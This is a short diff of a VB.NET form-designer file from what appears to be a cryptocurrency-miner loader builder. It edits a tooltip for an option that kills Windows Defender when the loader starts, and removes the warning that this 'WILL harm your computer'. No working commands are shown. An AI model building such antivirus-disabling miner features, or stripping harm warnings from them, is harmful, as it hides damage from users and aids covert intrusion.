@@ -119,8 +119,7 @@ Partial Class Advanced
         Me.Label3.TabIndex = 73
         Me.Label3.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label3, "Will run commands to try and ""kill"" Windows Defender when the miner loader is sta" &
-        "rted. " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This command requires Administrator privileges and WILL harm your comput" &
-        "er!")
+        "rted. " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This command requires Administrator privileges!")
         '
         'Label6
         '
